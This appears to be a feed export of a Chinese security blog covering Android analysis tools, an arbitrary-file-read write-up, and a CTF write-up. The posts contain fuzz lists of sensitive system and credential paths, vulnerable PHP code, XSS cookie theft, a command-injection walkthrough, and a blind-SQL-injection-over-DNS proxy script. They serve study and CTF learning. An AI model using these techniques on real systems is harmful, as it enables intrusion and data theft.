    <link href="http://xdxd.love/2016/08/09/%E5%AE%89%E5%8D%93%E5%88%86%E6%9E%90%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7Inspeckage%E4%BB%8B%E7%BB%8D/"/>
    <id>http://xdxd.love/2016/08/09/安卓分析辅助工具Inspeckage介绍/</id>
    <published>2016-08-09T07:12:04.000Z</published>
    <updated>2016-08-09T08:00:37.000Z</updated>
    <content type="html"><![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:<a href="http://repo.xposed.info/module/mobi.acpm.inspeckage" target="_blank" rel="external">Inspeckage - Android Package Inspector</a></p>
<p>Inspeckage的安装就不赘述了，参考xposed框架的安装以及使用。下面主要介绍一下Inspeckage的功能和使用。</p>
<p>安装之后，可以在桌面上看到inspeckage的图标。点开之后主界面如下：</p>
<p><img src="/images/inspeckage3.png" alt=""></p>
<p>在choose target下拉列表中选择要分析的app，这里以乌云峰会puzzle1中的apk为例进行介绍。然后在电脑的terminal中执行</p>
<p><code>adb forward tcp:8008 tcp:8008</code></p>
<p>转发手机的8008端口到本地。在电脑上访问<a href="http://127.0.0.1:8008" target="_blank" rel="external">http://127.0.0.1:8008</a> 就可以看到inspeckage的web界面了。</p>
<p><img src="/images/inspeckage5.png" alt=""></p>
<p>如图所示，inspeckage提供了对所分析apk的一些基本信息，提供直接下载apk到电脑，截图手机屏幕等辅助功能，最核心的功能是监控share preferences，加解密函数的使用，http访问等。下面一一分析。</p>
<p>设置选项中，提供了ssl uncheck，设置代理等。经过测试发现SSL uncheck效果一般。https流量依然很多抓不到。</p>
<p><img src="/images/inspeckage6.png" alt=""></p>
<p>使用logcat功能需要先转发端口到本地。<code>adb forward tcp:8887 tcp:8887</code></p>
<p>点击start，再点connect就可以在网页中实时查看该app的logcat输出。</p>
<p><img src="/images/inspeckage8.png" alt=""></p>
<p>Tree view按钮可以实时浏览app的数据目录并直接下载文件到本地。</p>
<p><img src="/images/inspeckage7.png" alt=""></p>
<p>wooyun这个puzzle的writeup中是使用smali插桩的方式打印出了aes加密的密钥。</p>
<p><img src="/images/inspeckage10.png" alt=""></p>
<p>如果采用inspeckage来分析的话，直接在crypto记录中就可以看到。</p>
<p><img src="/images/inspeckage11.png" alt=""></p>
<p>由于这个apk采用的md5方法是写在so中的，所以inspeckage的hash记录中并没有相关的记录。这个可以采用hook自定义函数的方式来解决。<br>反编译apk，找到调用so的方法为getPart2，同理其实也可以手动hookgetPart1。<br><img src="/images/inspeckage12.png" alt=""></p>
<p>设置好hook的方法后，重启app生效。</p>
<p><img src="/images/inspeckage13.png" alt=""></p>
<p>在hook的记录中可以看到getPart2的返回值。Inspeckage在动态分析apk的过程可以快速获得一些信息，节省分析的时间。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:<a href="http://repo.xposed.info/mo]]>
    </summary>
    
      <category term="inspeckage" scheme="http://xdxd.love/tags/inspeckage/"/>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一个任意文件读取漏洞记录]]></title>
    <link href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/05/23/一个任意文件读取漏洞分析/</id>
    <published>2016-05-23T07:27:05.000Z</published>
    <updated>2016-05-26T14:05:32.000Z</updated>
    <content type="html"><![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/passwd”)和include(“/etc/passwd”)黑盒来看的表现可能一样。而文件包含是可以getshell的，文件读取就只能读取文件。可以通过尝试读取相对路径的脚本文件，比如<code>/read.php?file=read.php</code>的方式，如果可以读取到文件源码，说明是文件读取，如果不能读取到文件源码说明是文件包含。</p>
<h1 id="文件读取">文件读取</h1><p>服务器上有价值的文件主要可以分为3类。通用的系统/应用配置文件，个性化的文件以及web应用的源码文件。而想要读取到一个文件只需要知道这个文件的绝对路径或者相对路径就可以了。</p>
<p>把web应用的源码单独出来是觉得应用源码可以很方便的通过相对路径获取到，不需要费劲得到源码的绝对路径。系统的通用配置文件比如</p>
<pre><code><span class="regexp">/etc/</span>passwd
<span class="regexp">/etc/my</span>.cnf
<span class="regexp">/etc/</span>shadow
<span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-scripts/i</span>fcfg-eth0   ip地址
<span class="regexp">/etc/</span>hosts                                  通常配置了一些内网域名
</code></pre><p>等等可以通过字典的方式来猜解。</p>
<p>这个案例通过passwd中获得的用户来获取到了这个用户的bash_history，从bash_history获取到了一些压缩包的地址。从而读取到了个性化的文件,一些压缩包的文件。<br><img src="/images/wenjianduqu2.png" alt=""><br><img src="/images/wenjianduqu3.png" alt=""></p>
<p>通过mysql的配置文件得知了数据的存储目录。通过直接读取数据库文件可以获取到数据库内的信息。</p>
<p><img src="/images/wenjianduqu4.png" alt=""></p>
<p>在说到文件包含利用的时候，会讲到有个小技巧，某些情况下可以包含proc下的文件。文件读取的情况下当然可以可以读取proc目录下的文件来获得更多系统的信息。</p>
<p><img src="/images/wenjianduqu5.png" alt=""></p>
<pre><code>/<span class="keyword">proc</span>/sched_debug  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/<span class="keyword">proc</span>/mounts 挂载的文件系统列表
/<span class="keyword">proc</span>/net/arp  arp表，可以获得内网其他机器的地址
/<span class="keyword">proc</span>/net/route 路由表信息
/<span class="keyword">proc</span>/net/tcp <span class="keyword">and</span> /<span class="keyword">proc</span>/net/udp  活动连接的信息
/<span class="keyword">proc</span>/net/fib_trie 路由缓存
/<span class="keyword">proc</span>/version  内核版本
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cmdline 可能包含有用的路径信息
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/environ 程序运行的环境变量信息，可以用来包含getshell
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cwd     当前进程的工作目录
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/fd/[<span class="comment">#]  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span>
</code></pre><p>fuzz字典：</p>
<pre><code>/<span class="keyword">proc</span>/self/cmdline
/<span class="keyword">proc</span>/self/stat
/<span class="keyword">proc</span>/self/status
/<span class="keyword">proc</span>/self/environ
/<span class="keyword">proc</span>/verison
/<span class="keyword">proc</span>/cmdline
/<span class="keyword">proc</span>/self/cwd
/<span class="keyword">proc</span>/self/fd/<span class="number">0</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">1</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">2</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">3</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">4</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">5</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">6</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">7</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">8</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">9</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">10</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">11</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">12</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">13</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">14</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">15</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">16</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">17</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">18</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">19</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">20</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">21</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">22</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">23</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">24</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">25</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">26</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">27</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">28</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">29</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">30</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">31</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">32</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">33</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">34</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">35</span>
/<span class="keyword">proc</span>/sched_debug
/<span class="keyword">proc</span>/mounts
/<span class="keyword">proc</span>/net/arp
/<span class="keyword">proc</span>/net/route
/<span class="keyword">proc</span>/net/tcp
/<span class="keyword">proc</span>/net/udp
/<span class="keyword">proc</span>/net/fib_trie
/<span class="keyword">proc</span>/version
</code></pre><h1 id="漏洞分析">漏洞分析</h1><p>读取到应用代码，对漏洞原因进行分析。</p>
<p>通过入口初始化文件读取到配置文件。</p>
<pre><code><span class="comment">/* 初始化设置 END */</span>
<span class="comment">//--------------------------------------------------</span>
<span class="keyword">require</span> (ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/includes/config.php'</span>);
<span class="class"><span class="keyword">define</span></span>(<span class="string">'CLS_PATH'</span>, ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/'</span>);
include ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/includes/base/autoload.class.php'</span>;
autoloader<span class="tag">::init</span>();
<span class="comment">/* 初始化memcached */</span>
<span class="comment">//$cache = new base_memcached();</span>
</code></pre><p>配置文件中自然有数据库账号，这个暂且不说。先看autoload.class.php。autoload实现自动加载类的功能。通过其实现方式拼接出存在漏洞的action类文件路径。</p>
<pre><code>/**
 * 固定路径的class 类文件 以.class.php 结尾
 */
private <span class="keyword">function</span> base_class(<span class="variable">$className</span>) {
    // echo <span class="string">"1 $className&lt;br /&gt;"</span>;
    <span class="variable">$path</span> = array();
    <span class="variable">$pathDir</span> = array();
    <span class="variable">$path</span> = explode(<span class="string">'_'</span>, <span class="variable">$className</span>);
    <span class="variable">$arrCount</span> = count(<span class="variable">$path</span>) - <span class="number">1</span>;
    <span class="variable">$pathDir</span> = implode(<span class="string">"/"</span>, array_slice(<span class="variable">$path</span>, <span class="number">0</span>, <span class="variable">$arrCount</span>));
    // set_include_path(get_include_path() . PATH_SEPARATOR . <span class="string">'/includes/'</span> . <span class="variable">$pathDir</span> . <span class="string">"/"</span>);
    set_include_path(CLS_PATH . <span class="string">"/includes/"</span> . <span class="variable">$pathDir</span>);
    spl_autoload_extensions(<span class="string">'.class.php'</span>);
    spl_autoload(<span class="variable">$path</span>[<span class="variable">$arrCount</span>]);
}
</code></pre><p>读到关键函数的源码：</p>
<pre><code>class models_index {
    public function newsList(<span class="variable">$url</span> = <span class="string">''</span>) {
        <span class="variable">$list</span> = @file_get_contents(<span class="variable">$this</span> -&gt; host.<span class="variable">$url</span>);
        return <span class="variable">$list</span>? <span class="variable">$list</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'出错了，没有找到该页面！'</span>);
    public function detail(<span class="variable">$url</span>) {
        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$url</span>);
        return <span class="variable">$content</span>? <span class="variable">$content</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'404'</span>,<span class="string">'出错了，没有找到该页面！'</span>);
    }
</code></pre><p>detail 方法获取到了url参数之后直接file_get_contents输出。最典型的任意文件读取漏洞。</p>
<h1 id="修复方案">修复方案</h1><p>白名单用户的输入就可以了。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/27434" target="_blank" rel="external">http://zone.wooyun.org/content/27434</a><br><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank" rel="external">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/]]>
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2016 CCTF writeup之萝莉之旅]]></title>
    <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
    <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
    <published>2016-05-03T03:33:35.000Z</published>
    <updated>2016-05-03T08:45:16.000Z</updated>
    <content type="html"><![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，感谢花时间精力准备的CCTF。loli1，loli2侥幸拿了一血，先装个逼。<br><img src="/images/cctf1.png" alt=""></p>
<h1 id="loli之旅">loli之旅</h1><p>打开首页萌了一脸，羞羞的图片，果然是loli.club啊。右键看了一下源码，除了一个注释貌似没有啥其他的信息了。</p>
<pre><code><span class="comment">&lt;!--
powered by PockyNya
诚招前端，请联系邮箱：pocky@loli.club
--&gt;</span>
</code></pre><p>google直接搜索PockyNya，找到其github。</p>
<p><img src="/images/cctf2.png" alt=""></p>
<p>分析第一个仓库pyprint:<br><img src="/images/cctf3.png" alt=""></p>
<p>可以找到一个博客地址：<a href="http://pocky.loli.club:41293/" target="_blank" rel="external">http://pocky.loli.club:41293/</a></p>
<p>有了网址和源码，自然是要对源码做一番审计。这里我其实是用了一个比较猥琐的方式快速找到了源码中的漏洞。<br>在PockNya的github主页上，可以看到他follow了一个人，RicterZ，点进去可以看到自然是这道题目的作者了。由于平时就关注了RicterZ的github和博客。在RicterZ的github也可以看到pyprint这个仓库，是自己博客的开源代码。所以接下来就是把两个仓库都clone下来，diff了一下。~~~</p>
<p>其实对于pyprint这个代码的审计，读一下commit时的comment可以发现很多信息，比直接看代码可以省不少功夫。不过有了diff大法，一切都是浮云。<br><img src="/images/cctf6.png" alt=""></p>
<h2 id="漏洞一">漏洞一</h2><p><img src="/images/cctf5.png" alt=""></p>
<p>看到登录页面login多了一个flag参数，查看模板文件，直接输出在了页面中，存在一个反射XSS。</p>
<pre><code>&lt;form class=<span class="string">"form-horizontal login-form"</span> role=<span class="string">"form"</span> action=<span class="string">"/login?flag="</span> <span class="keyword">method</span>=<span class="string">"post"</span>&gt;
</code></pre><p><img src="/images/cctf7.png" alt=""></p>
<p>反射XSS需要绕过浏览器audit，根据博客文章提示，找到xss地址之后，发到作者邮箱。试了一下才知道，这个XSS是个意外，很快就被修复了。</p>
<p><img src="/images/cctf8.png" alt=""></p>
<h2 id="漏洞二">漏洞二</h2><p><img src="/images/cctf9.png" alt=""></p>
<p>发现addpost这个方法的权限验证去掉了。查看相关模板，发现去掉了urlencode编码。导致越权发布文章，文章内容可以存储型XSS。根据代码中的接口和参数拼接请求。发布存储型XSS文章。将地址发给作者邮箱，获得cookie。cookie中flag参数解码就是最终的flag。</p>
<h2 id="漏洞三">漏洞三</h2><p><img src="/images/cctf10.png" alt=""></p>
<p>FileReadHandler存在任意文件读取的漏洞，看到这里很开心，可是被注释掉了。所有是逗你玩的代码了~~<br><img src="/images/cctf11.png" alt=""></p>
<h2 id="漏洞四">漏洞四</h2><p><img src="/images/cctf12.png" alt=""><br>这里其实也不算漏洞，看到不一样的代码就跟进去看看做了啥。查看日志的时候，验证了cookie。这里当时不记得怎么弄的了，xss打到的cookie早就加了进去，直接拼日志的地址就可以访问了。现在来看只要本地伪造一个cookie就可以绕过这个验证？添加cookie之后可以查看到一篇一个lua脚本的日志。</p>
<p><img src="/images/cctf13.png" alt=""></p>
<p>lua脚本源码：</p>
<pre><code><span class="operator"><span class="keyword">do</span>
<span class="keyword">local</span> <span class="keyword">function</span> run(msg, matches)
  <span class="keyword">if</span> matches[<span class="number">1</span>] ~= <span class="string">'!minecraft'</span> <span class="keyword">then</span>
    operation = matches[<span class="number">1</span>]
  <span class="keyword">else</span>
    <span class="keyword">return</span> <span class="string">"!minecraft start|stop|restart"</span>
  <span class="keyword">end</span>
  <span class="keyword">if</span> <span class="keyword">string</span>.find(operation, <span class="string">'&amp;'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'|'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'`'</span>) <span class="keyword">then</span>
    <span class="keyword">return</span> <span class="string">"Invalid operation "</span> .. operation
  <span class="keyword">end</span>
  <span class="keyword">local</span> <span class="keyword">t</span> = io.popen(<span class="string">'cd /home/telegram &amp;&amp; ./mc '</span> .. operation)
  <span class="keyword">local</span> a = <span class="keyword">t</span>:<span class="keyword">read</span>(<span class="string">"*all"</span>)
  <span class="keyword">return</span> a
<span class="keyword">end</span>
<span class="keyword">return</span> {
  description = <span class="string">"loli.club minecraft bot!"</span>,
  <span class="keyword">usage</span> = <span class="string">"!minecraft start|stop|restart"</span>,
  patterns = {
    <span class="string">"^!minecraft$"</span>,
    <span class="string">"^!minecraft (.*)$"</span>
  },
  run = run
}
<span class="keyword">end</span>%</span>
</code></pre><p>比较明显的命令注入漏洞。参考<a href="http://drops.wooyun.org/papers/1018" target="_blank" rel="external">Shell Injection &amp; Command Injection</a>。没有过滤分号<code>;</code>。</p>
<p>第一次用telegram，找到bot的账号花了一会时间。本身漏洞是比较典型的。</p>
<p><img src="/images/cctf14.png" alt=""></p>
<h1 id="DNS注入">DNS注入</h1><p>这个题目没有做出来。一是没有考虑到别人留的后门，再一个没找到回显的注入方式。writeup可以参考<a href="http://bobao.360.cn/ctf/detail/159.html" target="_blank" rel="external">FlappyPig CCTF-2016 WriteUp</a>。</p>
<p>一开始通过爆破域名，定位到ns.loli.club。发现该dns服务存在一些异常，但没有考虑到SQL注入，放出采用python和mysql搭建之后才考虑到sql注入。</p>
<p>使用nslookup可以简单验证，确实存在SQL注入。</p>
<p><img src="/images/cctf15.png" alt=""></p>
<p>没有找到回显的方式，尝试写一个代理，用sqlmap来进行盲注。发现dns.resolver模块对域名的合法性进行了检查，sqlmap拼出来的域名字段不是合法域名会报错。最后采用了分析dns协议，直接拼接二进制的方式写了一个布尔盲注的代理，用sqlmap跑出了数据。<a href="http://www.lisijie.org/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md" target="_blank" rel="external">dns协议解析</a></p>
<p>最终的代码：</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># encoding: utf-8</span>

<span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template
<span class="keyword">from</span> flask <span class="keyword">import</span> request, jsonify
<span class="keyword">import</span> socket
<span class="keyword">import</span> struct
<span class="keyword">import</span> time

app = Flask(__name__)
<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)
dns1 = h2bin(<span class="string">'''  a5 71 01 00 00 01 00 00  00 00 00 00 03 77 77 7704 6c 6f 6c 69'''</span>)
dns3 = h2bin(<span class="string">''' 00 00 01 00 01  '''</span>)
HOST=<span class="string">'120.27.149.210'</span>
PORT=<span class="number">53</span>

<span class="decorator">@app.route("/dns",methods=['GET','POST'])</span>
<span class="function"><span class="keyword">def</span> <span class="title">dnsquery</span><span class="params">()</span>:</span>
    name=request.args.get(<span class="string">'id'</span>)
    name=str(name)
    name_len=len(name)
    <span class="keyword">if</span> name_len&lt;<span class="number">10</span>:
        name_len1=<span class="string">'0'</span>+str(name_len)
    <span class="keyword">else</span>:
        name_len1=hex(name_len)
        <span class="keyword">print</span> name_len1

        <span class="keyword">if</span> len(name_len1)==<span class="number">3</span>:
            name_len1=<span class="string">'0'</span>+name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1
        <span class="keyword">else</span>:
            name_len1=name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1

    test=str(name_len)+<span class="string">'s'</span>

    <span class="keyword">print</span> test
    dnsdata=dns1+ h2bin(name_len1)+struct.pack(test,name) +dns3
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(dnsdata,(HOST, PORT))
    <span class="keyword">print</span> <span class="string">'sendall'</span>
    data=s.recv(<span class="number">1024</span>)
    <span class="keyword">return</span> repr(data[-<span class="number">4</span>:])

<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8765</span>,threaded=<span class="keyword">True</span>)
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[XSScookie利用工具cookie-hacker修改版]]></title>
    <link href="http://xdxd.love/2016/04/12/XSScookie%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7cookie-hacker%E4%BF%AE%E6%94%B9%E7%89%88/"/>
    <id>http://xdxd.love/2016/04/12/XSScookie利用工具cookie-hacker修改版/</id>
    <published>2016-04-12T07:49:06.000Z</published>
    <updated>2016-04-12T07:58:36.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
<p><img src="http://evilcos.me/wp-content/uploads/2013/10/123.jpg" alt=""><br>使用过程中遇到一个小问题。就是一个字段value值是base64编码的。里面有=号。使用cookiehacker写入的时候把等号自动给去掉了。</p>
<p>查看源码发现是这么写的。</p>
<pre><code>k = c.split(<span class="string">'='</span>)[<span class="number">0</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.split(<span class="string">'='</span>)[<span class="number">1</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
</code></pre><p>使用split等号来取值。导致value里的等号丢掉了。修改成使用substring取值，修复这个bug。</p>
<pre><code>k = c.<span class="keyword">substring</span>(<span class="number">0</span>,c.indexOf(<span class="string">'='</span>)).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.<span class="keyword">substring</span>(c.indexOf(<span class="string">'='</span>)+ <span class="number">1</span>).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>); 
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
<p><img sr]]>
    </summary>
    
      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[smali插桩调试apk]]></title>
    <link href="http://xdxd.love/2016/04/08/smali%E6%8F%92%E6%A1%A9%E8%B0%83%E8%AF%95apk/"/>
    <id>http://xdxd.love/2016/04/08/smali插桩调试apk/</id>
    <published>2016-04-08T01:45:16.000Z</published>
    <updated>2016-04-08T02:28:55.000Z</updated>
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentation</a></p>
<p><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
<h1 id="利用代码">利用代码</h1><pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
<span class="keyword">.source</span> <span class="string">"crack.java"</span>

<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .prologue</span>

   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentatio]]>
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[logcat使用指南]]></title>
    <link href="http://xdxd.love/2016/04/07/logcat%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://xdxd.love/2016/04/07/logcat使用指南/</id>
    <published>2016-04-07T06:08:27.000Z</published>
    <updated>2016-04-07T07:36:37.000Z</updated>
    <content type="html"><![CDATA[<p>一共5中日志的输出方式：</p>
<p>android.util.Log：提供了五种输出日志的方法</p>
<p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
<p>ERROR, WARN, INFO, DEBUG, VERBOSE</p>
<p>adb logcat 命令会有非常多的输出，可以通过pid来过滤特定app的输出。</p>
<h1 id="案例">案例</h1><p>房多多新房经纪人app logcat 默认输出了debug日志：</p>
<pre><code>/ActivityManager( <span class="number">1301</span>): Displayed com.fangdd.mobile.agent/com.fangdd.app.LoginActivity: +<span class="number">536</span>ms (total +<span class="number">1</span>s34ms)
I/Timeline( <span class="number">1301</span>): Timeline: Activity_windows_visible id: ActivityRecord{<span class="number">43</span>dbf058 u0 com.fangdd.mobile.agent/com.fangdd.app.MainActivity t319} <span class="built_in">time</span>:<span class="number">184792085</span>
I/Timeline( <span class="number">1301</span>): Timeline: Activity_windows_visible id: ActivityRecord{<span class="number">4549</span>a178 u0 com.fangdd.mobile.agent/com.fangdd.app.LoginActivity t319} <span class="built_in">time</span>:<span class="number">184792510</span>
D/dalvikvm(<span class="number">24780</span>): Trying <span class="built_in">to</span> <span class="built_in">load</span> lib /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>
D/dalvikvm(<span class="number">24780</span>): Added shared lib /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>
D/dalvikvm(<span class="number">24780</span>): No JNI_OnLoad found <span class="operator">in</span> /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>, skipping init
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(ProtoUtils.java:<span class="number">40</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">412</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">188</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.n.<span class="operator">a</span>(UserServerManager.java:<span class="number">245</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.ak.<span class="operator">a</span>(LoginActivity.java:<span class="number">147</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.<span class="operator">a</span>(BaseAsyncTask.java:<span class="number">23</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.doInBackground(BaseAsyncTask.java:<span class="number">8</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(ProtoUtils.java:<span class="number">40</span>)
